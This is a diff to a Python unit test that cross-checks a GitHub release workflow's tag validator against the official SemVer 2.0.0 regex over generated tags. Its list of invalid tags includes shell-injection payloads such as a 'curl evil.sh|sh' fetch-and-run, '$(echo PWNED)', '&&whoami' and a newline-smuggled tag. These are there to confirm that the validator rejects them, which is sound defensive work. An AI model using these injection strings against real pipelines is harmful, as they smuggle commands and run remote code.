@@ -20,19 +20,41 @@ from pathlib import Path
 
 WORKFLOW = Path(__file__).resolve().parents[1] / ".github/workflows/release.yml"
 
+# Ground truth: the official regex published at semver.org. Hand-written example lists keep
+# missing cases -- the first validator missed hyphens in prerelease identifiers, the second
+# missed the rule that *numeric* prerelease identifiers may not have leading zeroes. So the
+# workflow's pattern is cross-checked against the spec over a generated corpus instead.
+OFFICIAL_SEMVER = re.compile(
+    r"^(?:0|[1-9]\d*)\.(?:0|[1-9]\d*)\.(?:0|[1-9]\d*)"
+    r"(?:-(?:(?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*)"
+    r"(?:\.(?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*))*))?"
+    r"(?:\+(?:[0-9a-zA-Z-]+(?:\.[0-9a-zA-Z-]+)*))?$"
+)
+
+_CORES = ["1.2.3", "0.0.4", "10.20.30", "0.0.0", "01.2.3", "1.02.3", "1.2.03"]
+_PRES = ["", "-rc.1", "-rc-1", "-alpha", "-alpha.beta", "-0.3.7", "-0A", "-x.7.z.92",
+         "-alpha.0valid", "-01", "-alpha.01", "-01.2", "-", "-.", "-alpha..1"]
+_BUILDS = ["", "+build.7", "+build.01", "+21AF26D3-117B344092BD", "+", "+.", "+build..7"]
+
+
+def _semver_corpus():
+    """Every core x prerelease x build combination, with the spec's verdict for each."""
+    for core in _CORES:
+        for pre in _PRES:
+            for build in _BUILDS:
+                body = core + pre + build
+                yield "v" + body, bool(OFFICIAL_SEMVER.match(body))
+
+
 # Tags that are valid SemVer releases: the trigger should fire AND the validator accept.
-VALID = [
-    "v1.2.3", "v0.6.0", "v10.20.30", "v0.0.1",
-    "v1.2.3-rc.1", "v1.2.3-rc-1", "v1.0.0-alpha.beta",
-    "v1.2.3+build.7", "v1.2.3-rc.1+build.7",
-]
-# Tags the validator must refuse: non-releases, and shell-injection payloads that a crafted
-# workflow_dispatch input could supply.
-INVALID = [
+VALID = [t for t, ok in _semver_corpus() if ok]
+# Non-releases and shell-injection payloads a crafted workflow_dispatch input could supply.
+# These are not SemVer at all, so they are listed rather than generated.
+INVALID = [t for t, ok in _semver_corpus() if not ok] + [
     "v1", "v2", "v1.2", "vnext", "main", "master", "HEAD", "", "v", "1.2.3",
-    "v01.2.3", "v1.2.3 ", " v1.2.3",
+    "v1.2.3 ", " v1.2.3",
     'v0.6.0"; echo PWNED; "', "$(echo PWNED)", "v0.6.0; curl evil.sh|sh",
-    "v1.2.3&&whoami", "v1.2.3`id`",
+    "v1.2.3&&whoami", "v1.2.3`id`", "v1.2.3\nv9.9.9",
 ]
 
 
@@ -71,6 +93,29 @@ class TestReleaseTagPolicy(unittest.TestCase):
         # Guard against the extraction silently returning nothing and passing vacuously.
         self.assertTrue(_trigger_globs(), "no tag globs extracted")
         self.assertTrue(_validator_regex().startswith("^v"), "no validator regex extracted")
+
+    def test_corpus_is_non_trivial(self):
+        # Both lists must be populated, or the assertions below pass vacuously.
+        self.assertGreater(len(VALID), 50, "generated valid-tag corpus is suspiciously small")
+        self.assertGreater(len(INVALID), 50, "generated invalid-tag corpus is suspiciously small")
+
+    def test_validator_agrees_with_the_official_semver_regex(self):
+        """The workflow's ERE must classify every generated tag exactly as the spec does.
+
+        This is the assertion that catches what example lists miss. It found that
+        '[0-9A-Za-z-]+' wrongly accepted v1.2.3-01 and v1.2.3-alpha.01: SemVer forbids
+        leading zeroes in numeric prerelease identifiers, though not in build metadata.
+        """
+        rx = re.compile(_validator_regex())
+        disagreements = [
+            f"{tag} (spec={spec}, workflow={bool(rx.match(tag))})"
+            for tag, spec in _semver_corpus() if bool(rx.match(tag)) != spec
+        ]
+        self.assertEqual(
+            disagreements, [],
+            f"validator disagrees with SemVer 2.0.0 on {len(disagreements)} tag(s):\n  "
+            + "\n  ".join(disagreements[:20]),
+        )
 
     def test_validator_accepts_every_valid_semver_tag(self):
         rx = re.compile(_validator_regex())
